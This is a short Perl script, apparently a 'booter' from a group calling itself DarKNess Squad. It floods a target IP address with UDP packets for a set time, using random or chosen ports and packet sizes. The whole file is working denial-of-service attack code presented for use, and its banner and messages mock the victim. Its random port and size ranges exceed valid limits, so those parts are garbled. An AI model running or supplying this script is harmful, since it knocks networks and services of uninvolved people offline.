#!/usr/bin/perl
 
##
# PwNy<----
##
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print <<EOTEXT;
 
 _____             _  ___   _                  _____                       _ 
|  __ \           | |/ / \ | |                / ____|                     | |
| |  | | __ _ _ __| ' /|  \| | ___  ___ ___  | (___   __ _ _   _  __ _  __| |
| |  | |/ _` | '__|  < | . ` |/ _ \/ __/ __|  \___ \ / _` | | | |/ _` |/ _` |
| |__| | (_| | |  | . \| |\  |  __/\__ \__ \  ____) | (_| | |_| | (_| | (_| |
|_____/ \__,_|_|  |_|\_\_| \_|\___||___/___/ |_____/ \__, |\__,_|\__,_|\__,_|
                                                        | |                  
                                                        |_|                  

 
 Welcome to DarKNess script - 
EOTEXT
 
print "~DarKNess Killing~ $ip " . ($port ? $port : "random") . "
ResPecT WiFi" .
  ($size ? "$size-byte" : "THIS BOOUTER DONT WORK :(...O SHIT CALL 911 HIS MODEM ON FIRE!!") . "
~Attacking~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
